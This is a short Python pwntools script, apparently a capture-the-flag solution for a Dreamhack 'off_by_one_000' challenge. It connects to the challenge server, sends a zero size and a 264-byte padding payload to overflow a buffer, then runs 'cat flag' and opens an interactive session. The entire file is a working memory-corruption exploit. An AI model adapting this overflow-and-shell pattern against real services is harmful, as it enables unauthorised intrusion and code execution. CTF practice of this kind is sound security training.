from pwn import *
# e = ELF('./off_by_one_000')

def solve():
    r = remote('host1.dreamhack.games', 12008)
    payload = b'A' * 264    
    r.recvuntil('Size: ')
    r.sendline('0')
    r.recvuntil('Data: ')
    r.sendline(payload)
    r.sendline('cat flag')
    r.interactive()

if __name__ == '__main__':
    solve()